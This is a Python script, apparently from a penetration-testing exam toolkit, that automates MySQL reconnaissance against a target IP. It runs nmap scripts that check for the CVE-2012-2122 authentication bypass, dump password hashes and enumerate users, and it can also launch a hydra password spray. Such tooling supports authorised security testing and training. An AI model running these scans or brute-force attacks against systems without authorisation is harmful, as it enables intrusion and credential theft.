#!/usr/bin/env python
import subprocess
import sys
import argparse
import pathlib

#NSE Documentation
#Running
#mysql-databases: attempts to list databases. args mysqluser,mysqlpass. will use empty password if none provided/brute/etc
#mysql-dump-hashes: dumps hashes for John. requires root. args username,password
#mysql-empty-password: checks for Mysql servers with an empty password for 'root' or 'anonymous'
#mysql-enum: performs user enum using a bug. 5.x are susceptible when using old auth mechanism. seclists.org/fulldisclosure/2012/Dec/9
#mysql-info: connects and prints proto, version, thread, status, capabilities, password salt, etc
#mysql-variables: attempt to show variables on a server. requires auth. will use empty password if non provided.
#mysql-vuln-cve2012-2122: auth bypass in versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22.

#Not Running
#mysql-audit: audit security config against parts of CIS MySQL 1.0.2 benchmark --script-args mysql-audit.username,password,filename
#mysql-brute: brute guess against mySQL, seems beneficial to let nmap brute instead of hydra for additional nmap scripts args 'userdb''passdb'
#mysql-query: runs a query and returns the table args 'query''username''password'
def doNmap():
    print("INFO: Performing nmap MySQL script scan for %s:%s" % (ip_address, port))
    try:
        subprocess.check_output(['nmap','-n','-sV','-Pn','-vv','-p',port,'--script=mysql-empty-password,mysql-vuln-cve2012-2122,mysql-databases,mysql-dump-hashes,mysql-enum,mysql-info,mysql-variables,vulners','-oA','%s/%s_%s_mysql' % (BASE,ip_address,port),ip_address],encoding='utf8')
    except Exception as e:
        print(type(e))
        print("Unknown exception in doNmap in mysqlrecon")

#Hydra meant to do weak brute/spray, not extensive
#run manually for extensive brute
def doHydra():
    print("INFO: Performing hydra mysql scan against %s" % (ip_address))
    try:
        hydra_outfile = '%s/%s_%s_mysqlhydra.txt' % (BASE,ip_address,port)
        subprocess.check_output(['hydra','-L','/root/lists/userlist_sqlbrute.txt','-P','/root/lists/quick_password_spray.txt','-f','-o',hydra_outfile,'-u',ip_address,'-s',port,'mysql'])
        with open(hydra_outfile,'r') as h:
            for result in h:
                if "login:" in result:
                    print("[*] Valid mysql credentials found: %s" % (result))
    except subprocess.CalledProcessError as hydrerr:
        if hydrerr.returncode == 255:
            print("Hydra broke early with status 255, it must have found something! Check mysqlhydra for output.")
        elif hydrerr.returncode != 0:
            print("Hydra broke:")
            print(hydrerr.returncode)
            print(hydrerr.output)
        else:
            print("INFO: No valid mysql credentials found")

# mkdir_p function updated for >= python 3.5
def mkdir_p(path):
    pathlib.Path(path).mkdir(parents=True, exist_ok=True) 

if __name__=='__main__':
    parser = argparse.ArgumentParser(description='Rough script to handle checking MySQL endpoints. Usage: mysqlrecon.py {options} <ip address> <port>')
    parser.add_argument('ip_address', help="Ip address of target windows machine")
    parser.add_argument('port', help="Specific port to enumerate")
    parser.add_argument('--hydra', default=False, action='store_true', dest='hydra', help="Specify to run hydra")
    args = parser.parse_args()

    ip_address = args.ip_address
    port = args.port

    BASE = '/root/scripts/recon_enum/results/exam/mysql'
    mkdir_p(BASE)

    doNmap()
    if args.hydra:
        doHydra()